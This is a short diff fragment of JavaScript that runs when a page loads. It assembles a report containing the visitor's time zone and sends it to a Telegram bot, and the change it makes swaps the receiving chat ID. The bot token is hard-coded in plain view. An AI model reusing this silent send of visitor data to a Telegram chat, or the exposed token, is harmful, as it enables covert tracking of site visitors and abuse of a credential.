@@ -29,7 +29,7 @@ document.addEventListener('DOMContentLoaded', function() {
   └ Часовой пояс: ${timeZone}`;
       
       const token = '7073259932:AAHgb7DjDlGXrtO0HNFE-DGDsCWBWI7dQi4';
-      const chatId = '-4125502037'
+      const chatId = '-4174602769'
       const url = 'https://api.telegram.org/bot'+token+'/sendMessage';
       const formData = new FormData();
         formData.append('chat_id', chatId);
